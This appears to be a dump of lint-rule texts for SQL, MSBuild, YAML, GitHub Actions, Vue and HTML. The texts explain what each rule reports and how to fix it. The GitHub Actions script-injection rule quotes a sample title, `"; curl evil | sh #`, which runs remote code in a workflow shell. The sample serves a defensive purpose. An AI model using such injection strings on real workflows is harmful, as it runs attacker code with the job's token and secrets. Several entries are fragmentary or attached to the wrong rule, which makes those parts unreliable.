Most queries read from left to right and join the next table onto what came before. A right join makes the reader turn that around, and the same result is a `LEFT JOIN` with the tables in the other order.

To fix, swap the tables and use `LEFT JOIN`.

rules.description: Reports an alias that repeats the name it is given to, as in `a AS a`.
rules.why:
The alias does nothing: the name of the column is already `a`.

To fix, remove the alias.

rules.description: Reports a quoted identifier with a space or another character that is not a letter, a digit or an underscore. A column of a select element that has an alias is left alone.

example.input: select "a b", "ab", x as "c d" from "my t" as "q r";

rules.why:
A name with special characters has to be quoted in every query that uses it, and the quotes differ between databases. Tools that generate code from the schema fail on such names.

To fix, rename it with letters, digits and underscores.

rules.description: Reports a data type name not in the case that the `policy` option sets. With `consistent` (the default) the first one written fixes the case (`upper`, `lower` or `capitalise`) and a later one that cannot be in it is reported; the other values name the case. The fix writes the word in that case.

options.description: The case the words must be in: `consistent` follows the first one written.
options.name: policy

rules.why:
Type names in one case read as a group in a table definition or a cast, and a file that mixes cases looks inconsistent.

To fix, write the type name in the case that the policy gives.

rules.description: Reports a `UNION` that names neither `DISTINCT` nor `ALL`.
rules.why:
`UNION` removes duplicates, which costs a sort or a hash, and `UNION ALL` does not. Without a keyword a reader cannot tell whether the removal is wanted, or whether `ALL` was forgotten.

To fix, write `UNION DISTINCT` or `UNION ALL`.

rules.description: Reports a wildcard of the outermost query that resolves to a table: a `*` over a table, or over a subquery or common table that has one itself.
rules.why:
The columns of the result are whatever the table has now. A column added or reordered in the table changes the result of the query, and clients that read the result by position or by name break.

To fix, list the columns.

rules.description: Reports a column reference without a table in a select over more than one table or view. A name that an alias of another select element or a `USING` list gives is left alone.
rules.why:
With several tables, a name may exist in more than one of them, now or after a column is added. The query then fails as ambiguous, or the reader cannot tell which table a column comes from.

To fix, qualify the column with the table or its alias.

rules.description: Reports a table alias in a `FROM` clause that no qualified reference of the select, nested queries included, uses.
rules.why:
An alias that nothing uses is left over from an earlier version of the query, or a reference was written without it.

To fix, remove the alias, or use it.

rules.description: Reports a common table expression that nothing in the `WITH` statement refers to.
rules.why:
The expression is defined and never used, so the reader has to read the whole statement to find out that it does not matter.

To fix, remove it, or use it.

rules.description: Reports an element of a project file (`PackageReference`, `ProjectReference`, `Compile`, ...) that has the same `Include` as an earlier element of the same name in the same parent, on the later one.

example.input:
<Project>
  <ItemGroup>
    <PackageReference Include="A" Version="1" />
    <PackageReference Include="B" Version="1" />
    <PackageReference Include="A" Version="2"></PackageReference>
    <Compile Include="A" />
    <ProjectReference Include="B" />
  </ItemGroup>
  <ItemGroup>
    <PackageReference Include="A" />
  </ItemGroup>
</Project>

rules.why:
The repeat is a restore warning or a build error, and where it is not it is dead text that hides which of the two a later edit should change.

To fix, delete the repeat.

rules.description: Reports a `PackageReference` or `PackageVersion` whose `Version` contains `*` (`1.*`), on the attribute. No fix, because the version to pin is a decision.

example.input:
<Project>
  <ItemGroup>
    <PackageReference Include="A" Version="1.0.0" />
    <PackageReference Include="B" Version="1.*" />
    <PackageVersion Include="C" Version="*" ></PackageVersion>
    <Other Include="D" Version="1.*" />
  </ItemGroup>
</Project>

rules.why:
A floating version restores whatever is the newest match on the day of the build. Two builds of the same commit can use different packages, a new release can break the build without a change in the repository, and a compromised release arrives without anyone reading it.

To fix, pin the version (`1.2.3`), and update it on purpose.

rules.description: Reports a plain `yes`, `no`, `on`, `off`, `True`, `TRUE`, `False` or `FALSE` (in the usual casings), which are booleans to a YAML 1.1 parser and strings to a YAML 1.2 parser. Lowercase `true` and `false` are not reported. The fix quotes the value and is unsafe.

example.fixed:
"on": "True"
list: ["FALSE", false, true]
? "Yes"
: y
example.input:
on: True
list: [FALSE, false, true]
? Yes
: y

options.description: Also check mapping keys. Turn it off to keep GitHub workflow `on:`.
options.name: check_keys

options.description: Spellings that are not reported, for example `["on"]`.
options.name: allowed

options.description: Also report `true` and `false` (unless listed in `allowed`), for code that wants every boolean quoted or spelled out.
options.name: report_true_false

rules.why:
The same file means two things: Python's PyYAML reads `no` as `false`, while a YAML 1.2 parser reads it as the string `"no"`. The classic failure is the country code `NO` (Norway) turning into `false`, and a key `on` turning into `true`.

To fix, quote the value to make it a string, or write `true` or `false` where a boolean is meant.

rules.description: Reports jobs whose `needs` form a cycle, such as `a` needing `b` and `b` needing `a`.

example.input:
jobs:
  a:
    needs: b
  b:
    needs: [c]
  c:
    needs: a
  d:
    needs: a

rules.why:
A job starts when the jobs it needs have finished. In a cycle each job waits for another, so none of them can start, and GitHub rejects the workflow.

To fix, remove one of the `needs` that closes the cycle.

rules.description: Reports a script that uses a workflow command that GitHub has disabled or deprecated: `::set-output`, `::save-state`, `::set-env` or `::add-path`.

example.input:
jobs:
  a:
    steps:
      - run: echo "::set-output name=v::1"
      - run: |
          echo "::save-state name=a::b"
          echo ok
      - run: echo "::notice::fine"

rules.why:
GitHub disabled `set-env` and `add-path` because any tool that prints a line to the log could set an environment variable or change the `PATH` of the job, so those two no longer work. `set-output` and `save-state` have the same weakness, are deprecated and make the run show a warning.

To fix, append to the file the runner provides: `echo "name=value" >> "$GITHUB_OUTPUT"`, and `$GITHUB_STATE`, `$GITHUB_ENV` or `$GITHUB_PATH` for the others.

rules.description: Reports a document without the `...` end marker, or with `present: false` one that has it.

example.config:
document-end:
  level: warn
  options:
    present: false

options.description: `true` requires `...` after every document (fixable); `false` forbids it.
options.name: present

rules.why: Some projects require the end marker so a stream that was cut off is easy to tell from one that is complete. Most files leave it out, which is why the rule is off by default.

rules.description: Reports a first document that does not start with `---`. A document that has directives (`%YAML`) already starts with `---`.

example.fixed:
---
# comment
a: 1
example.input:
# comment
a: 1

rules.why: The `---` marker makes it clear where a document starts, and it is required to put a directive in front. Some projects require it so that every file looks the same and several documents can be concatenated.

rules.description: Reports job ids that differ only in case (job ids are not case sensitive; exact repeats are a different rule, `no-duplicate-keys`), and step ids repeated within a job.

example.input:
jobs:
  Build:
    runs-on: ubuntu-latest
    steps:
      - id: a
        run: echo
      - id: A
        run: echo
      - id: b
        run: echo
  build:
    runs-on: ubuntu-latest
  other:
    runs-on: ubuntu-latest
    steps:
      - id: a
        run: echo

upstream.note: partial

rules.why:
Ids are compared without case, so a reference such as `needs.build` cannot tell two such jobs apart, and `steps.<id>.outputs` cannot tell two steps with one id apart.

To fix, give each job and step its own id.

rules.description: Reports an expression that reads a context, or calls a special function, that the key it is in does not offer (`env` in the `env` of a job, `runner` in a matrix).

upstream.note: The contexts and special functions each key offers (table in `lang-github-actions/src/expression.rs`).

rules.why:
Each key of a workflow can use only some contexts, since the others do not exist yet when it is evaluated. An expression that reads another one does not get its value.

To fix, use a context the key offers, or move the value to a key that has it.

rules.description: Reports an expression whose types do not fit: a property that an object does not have, a comparison of values that cannot be compared, a wrong number or type of arguments, or an object where text is expected.

upstream.note: Properties of the typed contexts, argument counts and types, `format` placeholders; not the types of `steps`, `needs`, `matrix` and `inputs` (they depend on other keys).

rules.why:
Expressions fail without an error: a property that does not exist is an empty string, and an object where text is expected becomes the text `Object`. The workflow runs with a wrong value.

To fix, correct the property, or the types.

rules.description: Restricts how plain floats are written. Every option is off until set: `require_numeral_before_decimal` reports `.5`, `forbid_scientific_notation` reports `1e3`, `forbid_nan` reports `.nan` and `forbid_inf` reports `.inf`. Quoted and tagged scalars are not checked. The fix for `.5` is `0.5`.

options.description: Report `.5`, `-.5e3`: a digit must come before the decimal point.
options.name: require_numeral_before_decimal

options.description: Report `.nan`, `.NaN`, `.NAN`.
options.name: forbid_nan

options.description: Report `.inf`, `-.Inf`, `+.INF`.
options.name: forbid_inf

rules.why: YAML 1.1 and 1.2 parsers read some float spellings differently (`1e3` is a string in YAML 1.1, since it requires a dot), and `.5` is hard to see. A project can choose the spellings that every parser it uses reads the same way.

rules.description: Reports an `if:` that is a constant (`if: false`), or one with text around its `${{ }}`, which makes it a non-empty string that is always true (`if: ${{ a }} && ${{ b }}`).

example.input:
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo
        if: false
      - run: echo
        if: ${{ github.ref }} && true
      - run: echo
        if: "${{ github.ref == 'x' }} "
      - run: echo
        if: github.ref == 'x' && !cancelled()
      - run: echo
        if: ${{ github.ref == 'x' }}

upstream.note: Constant conditions and text around the markers of an `if:`.

rules.why:
A string with text around the expression is never false, even when the expression is `false`, so the step or job always runs. A constant condition is left in by mistake after a test.

To fix, write the whole condition inside one `${{ }}`, or without it.

rules.description: Reports an event name, activity type, filter or schedule that the `on` section cannot have.

example.input:
on:
  pushh: {}
  push:
    branches: [main]
    branches-ignore: [dev]
  pull_request:
    types: [opened, created]
  pull_request_review:
    types: submitted
    tags: v1
  schedule:
    - cron: '0 0 * *'
    - cron: '0 0 * * 9'
    - cron: '*/15 0-5 * * mon'
    - cron: '*/4 * * * *'
    - cron: '0 1 * * *'
      timezone: Europe/Berlin
    - cron: '0 1 * * *'
      timezone: UTC
  workflow_dispatch:
    inputs:
      kind:
        type: choice
      flag:
        type: boolean
        default: yes
      ok:
        type: choice
        options: [a, b]
        default: a
      empty:
        options: []
  workflow_call:
    inputs:
      n:
        type: number
        default: x
      r:
        required: true
        default: 1
jobs: {}

upstream.note: A default that does not fit the type or the options, options on a non-choice input, a choice without options, a default on a required workflow_call input.
Event names, activity types and the keys of event sections.
Cron lines (field count, ranges); not time zones or the shortest interval.
A filter and its `-ignore` twin together.

rules.why:
An event or activity type that GitHub does not have never fires. A misspelled `pushh`, or a type that the event does not have, means the workflow does not run when its author expects.

To fix, use the event, type and filter that the documentation lists.

rules.description: Reports a `${{ }}` expression that is not closed or is empty, that does not parse (unbalanced brackets, a string that is not closed, a character expressions do not have, such as a double quote), or that names a context or function that does not exist.

upstream.note: The grammar is not parsed: a misplaced operator or a missing operand is not reported.

rules.why:
The mistake shows only after the workflow is pushed, when the run fails.

To fix, correct the expression.

rules.description: Reports a branch, tag or path filter that is not a valid pattern: a bad range or escape, a character that a ref name cannot have, or `.` or `..` in a path.

example.input:
on:
  push:
    branches:
      - 'release/**'
      - '^foo-'
    tags:
      - 'v*+'
      - 'v[9-1]'
      - 'v[0-'
      - 'v1.*'
    paths:
      - ./foo/bar.txt
      - 'src/**'
      - '  foo'
jobs: {}

upstream.note: Glob syntax (ranges, escapes, quantifiers), ref name characters and path dots of the filters; messages differ.

rules.why:
A pattern that GitHub cannot read does not select the refs or paths it was written for, so the workflow runs for the wrong pushes or not at all.

To fix, correct the pattern.

rules.description: Reports a job id that does not start with a letter or `_`, or that has a character other than letters, digits, `-` and `_`.

example.input:
jobs:
  build:
    runs-on: ubuntu-latest
  _x-1:
    runs-on: ubuntu-latest
  build app:
    runs-on: ubuntu-latest
  1st:
    runs-on: ubuntu-latest

rules.why:
GitHub rejects the workflow with a message about the id, and in expressions the id is used as a name (`needs.<id>`), where other characters do not work.

To fix, rename the job.

rules.description: Reports a permission scope or value that GitHub does not have.

example.input:
on: push
permissions:
  content: read
  id-token: read
  contents: write
jobs:
  a:
    runs-on: ubuntu-latest
    permissions: read
    steps:
      - run: echo

upstream.note: Scopes and values.

rules.why:
A misspelling like `content: read` does not grant the access that the job needs, and a job that sets `permissions` has no access to the scopes it does not name.

To fix, use a known scope with a value it takes (`read`, `write` or `none`).

rules.description: Reports a `runs-on` label that is not one of the known runner labels. A job that also has `self-hosted` is not checked, `${{ matrix.name }}` stands for the values of the matrix, and other expressions are skipped.

example.input:
jobs:
  a:
    runs-on: ubuntu-latest
  b:
    runs-on: ubuntu-lates
  c:
    runs-on: [self-hosted, gpu]
  d:
    runs-on: [ubuntu-22.04, windows-2022]
  e:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, linux-latest]
        include:
          - os: macos-10
  f:
    runs-on:
      group: big
      labels: [ubuntu-large]
  g:
    runs-on: macos-15
  h:
    runs-on:
    steps: []

options.description: Regular expressions; a label is valid when one matches all of it, ignoring case.
options.name: labels

upstream.note: Sudsy's list is patterns for the hosted images, not the list of one actionlint release; labels with an expression are not checked.

rules.why:
A label that no runner has leaves the job queued with no runner to take it. A misspelling such as `ubuntu-lates` is the usual cause. The option `labels` lists the known labels.

To fix, use a label of a hosted runner, or add `self-hosted` for your own.

rules.description: Reports a job with no `permissions`, in a workflow with no top-level `permissions`.

example.input:
jobs:
  a:
    runs-on: ubuntu-latest
  b:
    permissions: read-all
    runs-on: ubuntu-latest

rules.why:
Without `permissions`, the `GITHUB_TOKEN` gets the default of the repository or organization, which for older repositories is read and write on most scopes. A compromised step or action then has more access than the job needs.

To fix, set `permissions` with only the scopes the job uses, for example `contents: read`.

rules.description: Reports an anchor name that is defined again in the same document, on the second `&name`.
rules.why:
An alias refers to the latest definition above it, so after a repeated anchor the same `*name` can mean two different nodes depending on its place, which is easy to misread.

To fix, give the second anchor another name.

rules.description: Reports a mapping key or sequence entry without a value (an implicit null), at the `:` or `-`. A value with an anchor or tag is not empty. The options `block_mappings`, `flow_mappings` and `block_sequences` choose what is checked.

example.input:
key:
list:
  -
full: 1

options.description: Check block mappings.
options.name: block_mappings

options.description: Check flow mappings (`{a: }`).
options.name: flow_mappings

options.description: Check block sequences.
options.name: block_sequences

rules.why:
An empty value is `null`, but it is easy to read as an omission or a value that was lost while editing, and parsers of config files may treat `null` and a missing key differently.

To fix, write `null` or `~`, or give the key its value.

rules.description: Reports a flow mapping (`{a: 1}`), on its opening brace. With `allow_empty`, an empty one (`{}`) is not reported.

example.config:
no-flow-mappings:
  level: warn
  options:
    allow_empty: true

options.description: Do not report empty collections (`{}`, `[]`).
options.name: allow_empty

rules.why:
Block style is the main style of YAML: one entry to a line, with diffs that show a single changed entry. A flow mapping packs entries on one line, so a change touches the whole line and long ones wrap badly.

To fix, write the entries on their own lines.

rules.description: Reports a flow sequence (`[a, b]`), on its opening bracket. With `allow_empty`, an empty one (`[]`) is not reported.

example.config:
no-flow-sequences:
  level: warn
  options:
    allow_empty: true

options.description: Do not report empty collections (`{}`, `[]`).
options.name: allow_empty

rules.why:
Block style is the main style of YAML: one item to a line, with diffs that show a single changed item. A flow sequence packs items on one line, so a change touches the whole line and long ones wrap badly.

To fix, write one `- item` per line.

rules.description: Reports the merge key `<<`.

example.input:
base: &base
  a: 1
b:
  <<: *base
  c: 2
d: "<<"

upstream.note: The shared reference rule, enabled by the preset for workflows.

rules.why:
The merge key is from YAML 1.1; YAML 1.2 dropped it from the specification. Parsers that follow 1.2 strictly or do not implement it read `<<` as an ordinary key, so the merged values are missing.

To fix, write the merged entries out or let the tool that reads the file expand the anchors.

rules.description: Reports a plain `0755` (octal to YAML 1.1 parsers, decimal 755 to YAML 1.2) or `0o755` (octal to YAML 1.2, a string to YAML 1.1). Quoted and tagged scalars are not checked. The options `implicit` and `explicit` choose which form is reported. No fix: the intended value is not known.

example.input:
mode: 0755
name: "0755"

options.description: Report `0755`.
options.name: implicit

options.description: Report `0o755`.
options.name: explicit

rules.why:
The same text is a different number to different parsers: a file mode written as `0755` is 493 to one and 755 to the other, so the permissions come out wrong without an error.

To fix, quote the value (a string that the program converts itself) or write the decimal number.

rules.description: Reports an alias that is inside the node of its own anchor, which makes the data refer to itself.

example.input:
a: &x
  b: *x
c: &y 1
d: *y
e: &z
  f: 1
g: *z

upstream.note: The shared reference rule, enabled by the preset for workflows.

rules.why:
The data is then a loop with no end. Parsers either refuse the file or build a cyclic structure that breaks the first program that walks it, for example when it is printed or converted to JSON.

To fix, remove the alias or move it out of the anchored node.

rules.description: Reports an alias that names an anchor not defined earlier in the same document, on the alias.

upstream.note: The shared YAML rule, enabled by the preset for workflows.

rules.why:
YAML requires the anchor to come first, in the same document, so the file is invalid and a parser stops with an error.

To fix, define the anchor above the alias, or fix the name.

rules.description: Reports an anchor that no alias refers to. The fix removes the anchor and changes nothing about the data.

example.fixed:
a: 1
b: &y 2
c: *y
example.input:
a: &x 1
b: &y 2
c: *y

upstream.note: The shared YAML rule, enabled by the preset for workflows.

rules.why: An anchor that nobody uses is left from a removed alias and makes a reader look for the place that shares the node.

rules.description: Reports a step that uses a popular action at a version whose runner (the Node version it runs on) is retired, from a list of actions kept with the rule.

example.input:
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: actions/checkout@v4
      - uses: actions/checkout@v3.1.0
      - uses: ./local

upstream.note: The specs of actionlint's list of outdated popular actions (`data/outdated-actions.txt`, copied from its pinned release).

rules.why:
GitHub retires the Node runtimes that old action versions use. Their jobs print deprecation warnings and, once the runtime is removed, fail.

To fix, update the action to a newer version.

rules.description: Reports strings that are quoted or unquoted against the rule you set with `required`: `always` wants quotes on every string, `only_when_needed` reports quotes that change nothing (unless `extra_allowed` matches) and plain strings that `extra_required` matches, `optional` only the latter. `quote_type` sets the quotes. Plain scalars that are not strings (`12`, `true`, `null`, dates, ...), block scalars and scalars tagged `!!` are never checked.

example.fixed:
name: "bar"
quoted: "baz"
num: 1
example.input:
name: bar
quoted: "baz"
num: 1

options.description: The quotes to use. `consistent`: the first quoted string of the file decides.
options.name: quote_type

options.description: `always`: every string is quoted. `optional`: quotes are free, but must be of `quote_type`. `only_when_needed`: quotes only where the string would otherwise read as something else.
options.name: required

options.description: Regular expressions; a string they match (searched in the value) must be quoted even with `optional` or `only_when_needed`.
options.name: extra_required

options.description: Regular expressions; a string they match may be quoted with `only_when_needed`.
options.name: extra_allowed

options.description: Accept the other quote type when the string contains the wanted quote.
options.name: allow_quoted_quotes

options.description: Check mapping keys too.
options.name: check_keys

rules.why:
Whether to quote is a style choice, but it matters for safety: an unquoted `no`, `1e3` or `0755` is not the string it looks like. A project that always quotes strings never has to know which words YAML reads as something else, and one that never quotes unless needed keeps the files short.

Fixes quote a plain string and change the quote type, both keep the value. Removing quotes is unsafe, since a YAML 1.2 parser reads some strings (`1e3`) as numbers.

rules.description: Reports an expression in a `run` script that reads text that an attacker can choose, such as the title or body of an issue or pull request, a branch name or a commit message.

example.input:
jobs:
  a:
    steps:
      - run: echo "${{ github.event.issue.title }}"
      - run: |
          echo ${{ github.head_ref }}
          echo ${{ github.event.commits[0].message }} ${{ github.sha }}
      - name: ${{ github.event.issue.title }}
        run: echo "$TITLE"
        env:
          TITLE: ${{ github.event.issue.title }}
      - run: echo '${{ toJSON(github.event.*.body) }}'
      - uses: actions/github-script@v7
        with:
          script: console.log('${{ github.event.head_commit.message }}')

upstream.note: The contexts are a fixed list.

rules.why:
The runner replaces the `${{ }}` expression with its value before the shell sees the script. A title like `"; curl evil | sh #` becomes part of the script and runs with the job's token and secrets.

To fix, pass the value through an environment variable (`env:`) and read `"$VAR"` in the script.

rules.description: Reports a `needs` entry that names a job that the workflow does not define.

rules.description: Reports an element that has `v-html` or `v-text` and also content between its tags.
rules.why:
The directive replaces the content of the element, so the text between the tags is never shown. It is a leftover or a mistake.

To fix, remove the content, or the directive.

rules.description: Reports an Internet Explorer conditional comment (`<!--[if IE]>`).
rules.why:
Only Internet Explorer 9 and older read the content; every other browser sees a comment, so it is code that no current browser runs.

To fix, remove the comment, or replace it with feature detection or CSS.

rules.description: Reports an attribute that HTML5 no longer has on that element (`align`, `bgcolor`, `border`, ...).

example.input:
x x
x
x

rules.why:
Presentation in attributes is outdated and browsers may stop honoring it; it also overrides less specific CSS in surprising ways.

To fix, use CSS.

rules.description: Reports `<template functional>`.
rules.why:
Vue 3 removed functional single file templates, so the component does not work.

To fix, write a function component.

rules.description: Reports an `is` attribute on a plain HTML element that does not begin with `vue:` (`<tr is="row">`). Only in `.vue` files, where a plain `is` would make a customized built-in element.
rules.why:
In Vue 3 a plain `is` on an HTML element creates a native customized built-in element, not a Vue component.

To fix, write `is="vue:row"`, or use `<component :is>`.

rules.description: Reports the `inline-template` attribute.
rules.why:
Vue 3 removed it, so the content of the tag is not used as the template of the component.

To fix, use a slot.

rules.description: Reports the `scope` attribute on a `<template>`.
rules.why:
Vue 3 removed it, so the slot props are not passed to the content.

To fix, use `v-slot`.

rules.description: Reports the `slot` attribute on an element that is not a `<slot>`. Only in `.vue` files, because in HTML `slot` assigns an element to the slot of a web component.
rules.why:
Vue 3 removed the attribute for a named slot, so the content is not put in the slot.

To fix, use `v-slot` (`#name`) on a `<template>`.

rules.description: Reports the `slot-scope` attribute.
rules.why:
Vue 3 removed it, so the slot props are not passed to the content.

To fix, use `v-slot` (`#name="props"`).

rules.description: Reports the `.sync` modifier of `v-bind` (`:title.sync`).
rules.why:
Vue 3 does not have `.sync`: the binding then does not update the parent, and the component works only until the first change.

To fix, write `v-model:title="t"`.

rules.description: Reports the `v-is` directive.
rules.why:
Vue 3 removed it, so the element is not turned into the component.

To fix, write `is="vue:name"`.

rules.description: Reports the `.native` modifier of `v-on` (`@click.native`).
rules.why:
Vue 3 removed it, so the listener is not added to the root element of the component.

To fix, declare the event in `emits` of the component, or listen on its root element.

rules.description: Reports a key code as a modifier of `v-on` (`@keyup.13`).
rules.why:
Vue 3 removed key codes, so the listener never fires. The numbers are also deprecated in browsers.

To fix, write the key name (`@keyup.enter`).

rules.description: Reports a name defined twice in `props`, `computed`, `data`, `methods` and `setup` of a component object, and a prop or `defineModel` of `<script setup>` that a top-level name of the script (a `const`, a function, an import) repeats, unless that name reads from the props object (`const a = props.a`, `toRef(props, 'a')`).

To fix, rename one of them.

rules.description: Reports a `v-else-if` whose condition is the same as an earlier `v-if` or `v-else-if` of the chain. Conditions are compared as text without blanks, and `||` alternatives one by one; a condition that only some earlier `&&` terms cover is not found. Only in `.vue` files.

The earlier branch with the same condition always wins, so this branch can never run. It is usually a copy that was meant to have another condition.

To fix, change the condition, or remove the branch.

example.input: text

rules.why:
Without a type an input is a text field, which is easy to read as an omission; with the type written, the intent is in the markup and tools that look for text fields find it.

rules.description: Reports a nested `<template>` that has no directive (`v-if`, `v-for`, `v-slot`, ...). Only in `.vue` files.
rules.why:
A `<template>` with no directive is a wrapper that Vue renders without its own element, so it does nothing and only adds a level.

To fix, remove the tag and keep its content, or add the directive that was meant.

rules.description: Reports an attribute that refers to an `id` (`for`, `aria-labelledby`, `list`, `headers`, `form`, ...) when no element of the document has that id.

upstream.note: no include and exclude options

rules.why:
A reference to nothing silently does nothing: a label that labels no control, a description that is never read, a list that offers no choices.

To fix, correct the id or add the element that has it.

rules.description: Reports a second `<main>` element that is not `hidden`.

  • b

rules.why:
A page has one main landmark; a second one makes the shortcut of a screen reader to the main content ambiguous.

To fix, use one `<main>`, or mark the other `hidden`.

rules.description: Reports `!(x | async)` and `(x | async) === false` in an Angular template. Only in `.component.html` files.

example.input:
{{ a != b ? "x == y" : 1 }}

@if (a == 1) { } @for (x of xs) { } @for (x of xs; track x.id) { }

upstream.note: `!(x | async)` and `(x | async) === false`

rules.why:
The `async` pipe returns `null` before the stream emits its first value, so the negated test is true while the data is still loading, and the template shows the empty or error state for a moment.

To fix, compare with the value the stream emits, or use `@if` and `@else` on the pipe's result.

rules.description: Reports a `<label>` whose `for` names a control that is inside the label.
rules.why:
The label already names the control it holds, so the `for` and the `id` it needs say the same thing twice, and they can drift apart when one is renamed.

To fix, remove the `for` (and the `id` if nothing else uses it).

rules.description: Reports a `role` on an element that already has that role by its name (`<nav role="navigation">`, `<button role="button">`, `<ul role="list">`).

rules.why:
The role adds nothing and can only fall out of step with the element: when the element is later changed to another one, the old `role` overrides the native meaning.

To fix, remove the `role`.

A stylesheet that is part of the page is sent again with every page, cannot be cached or shared, and is blocked by a strict content security policy.

rules.description: Reports a link to another site with `target="_blank"` that does not have both `noopener` and `noreferrer` in its `rel`. A link to a scheme or host and a computed link (`{href}`, `bind:href`, `:href`) count; a relative link does not.

rules.why:
The opened page can reach this one through `window.opener` in old browsers and change its location (a phishing page), and it gets the referrer of the page it came from.

To fix, add `rel="noopener noreferrer"`.

To fix, bind the value with `v-model`.

In Vue 3 the key belongs on the `<template v-for>`; a key on a child is not used, so the list is patched in place and state stays on the wrong element.

rules.description: Reports an element with `v-html`.
rules.why:
`v-html` inserts the text as markup, so a value that a user wrote can carry a script and runs it in the page: a cross-site scripting hole.

rules.description: Reports an element with `v-text`.

`v-text` replaces the whole content of the element, while `{{ }}` can sit among other text, and most Vue code uses the mustache, so two forms mean the same.

rules.description: Reports a `role` that a native element already has (`main`, `navigation`, `button`, `list`, ...) when it is on an element that is not that one (`<div role="main">`, `<a role="button">`).
